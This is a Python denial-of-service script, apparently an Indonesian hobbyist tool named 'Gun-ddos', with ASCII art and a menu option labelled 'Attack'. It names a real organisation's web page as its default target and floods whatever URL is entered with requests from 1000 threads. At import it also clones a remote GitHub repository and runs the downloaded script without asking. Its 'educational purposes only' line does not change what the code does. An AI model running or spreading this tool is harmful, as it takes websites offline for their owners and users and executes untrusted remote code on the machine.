import requests
import threading
import time
import signal
import subprocess
# ASCII art
ascii_art = """ 

           --                                                      -+-                    
         :++++++++=++++++++++++++++==+++++#########+@%%%%%%%@*@*======+=                  
         =++++++++**********************+*@%%%%%%%#*#%##@#%%**%-.   %%:+#:=+-             
         *%%%%%%@+*####################**#########%%%*+%+*@*##=##+*-==:*%*%+              
         .#######*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*@**%+*%*%*+%**@**%+@+               
          =%#####+######################++++*########*=+#++*-**+#+=*=+#++**               
           -:-++++++++++++++++++++++===+#%%%@@@@@%@%@*-#@*#@@@@@.+%@=   =#%%*==-.         
                                          -#: %+----++-+@-=======#%%@..%%#=---==-         
                                            *+       #@ :*%%%%%%%%%%%*+%:                 
                                             =       +# :#%%%%%%%%%%%%+=                  
                                             =       : :=*+%%%%%%%%%%%%-                  
                                             =::----::--:++%%%%%#***%%%%:                 
                                                         *%*%%%+#%%%-%%%%-                
                                                         :@*%%%**%%#=%%%%%:               
                                                          #*@%%%%#*%%%%%%%%.              
                                                          :%*%%%%%%%%%%%%%%*              
                                                           #=@%%%%%%%%%#-+%%.             
                                                           +##%%%%%%%%%%+#%%*             
                                                           =@+%%%%%%%%%%%%%%#             
                                                           #%%###############             
                                                           -=++++++++++++:..              
                                                                                                                                       
"""

# URL target yang akan diakses
url = "https://www.sii.org.il/en/water-and-plastucs-pipeline"  # Gantilah ini dengan URL target Anda

# Fungsi yang akan mengirim permintaan
def order_1(url, order_count):
    try:
        while True:
            response = requests.get(url)
            if response.status_code == 200:
                order_count += 1
                print("Permintaan berhasil dikirim. Jumlah order: {}".format(order_count))
                if order_count >= 20:
                    print("Syarat order telah terpenuhi.")
                    break
            else:
                print("Gagal mengirim permintaan. Kode status:", response.status_code)
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("Dihentikan oleh pengguna.")
        # Anda dapat melakukan pembersihan yang diperlukan di sini

    return order_count

# Fungsi utama
def main():
    print(ascii_art)
    print("Author: Koboi Kepri")
    print("[1] Attack")  # Mengganti pilihan menjadi "[1] Attack"
    print("[*] Ctrl+C to exit")  # Menambahkan petunjuk Ctrl+C to exit
    choice = input("Pilih aksi: ")

    if choice == "1" or choice == "01":  # Menerima "1" atau "01" sebagai pilihan yang valid
        # Catatan "note" dihapus dan digantikan dengan "Ctrl+C to exit"
        print("This tool is intended for educational purposes only. I am not responsible if anything happens to you.")
        
        # Meminta pengguna untuk memasukkan URL target dan jumlah pesanan
        target_url = input("Masukkan URL target: ")
        jumlah_order = int(input("Masukkan jumlah order yang Anda inginkan: "))
        
        print(f"Nama website: {target_url}")

        # Konfirmasi tindakan
        confirmation = input("Lanjutkan serangan? (y/n): ").strip().lower()
        if confirmation == "y":
            jumlah_order = order_1(target_url, jumlah_order)
            
            # Setelah syarat order terpenuhi, lanjutkan serangan
            if jumlah_order >= 20:
                print("Syarat order telah terpenuhi. Memulai serangan...")
                send_request_threads(target_url)
                print("Permintaan order selesai.")
            else:
                print("Jumlah order belum mencukupi untuk melanjutkan serangan.")
        else:
            print("Serangan dibatalkan.")

# Fungsi untuk mengirim permintaan dengan multi-threading
def send_request_threads(url):
    num_threads = 1000  # Gantilah dengan jumlah thread yang Anda inginkan
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=order_1, args=(url, 0))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Tautan GitHub repositori yang ingin Anda klone
github_repo_url = "https://github.com/Koboi-kepri/Gun-ddos.py.git"

# Nama direktori tempat Anda ingin mengkloning repositori
repo_directory = "Gun-ddos.py"

# Lakukan git clone
try:
    subprocess.run(["git", "clone", github_repo_url, repo_directory])
    print("Repositori Gun-ddos telah berhasil dikloning.")

    # Setelah mengkloning, Anda dapat menjalankan alat Gun-ddos
    # Ganti dengan perintah yang sesuai untuk menjalankan alat ini
    # Misalnya, perintah berikut ini (sesuaikan dengan alat yang sebenarnya):
    subprocess.run(["python", "Gun-ddos.py"])

except subprocess.CalledProcessError:
    print("Terjadi kesalahan saat mencoba mengkloning repositori.")
except KeyboardInterrupt:
    print("Dihentikan oleh pengguna.")


if __name__ == "__main__":
    main()
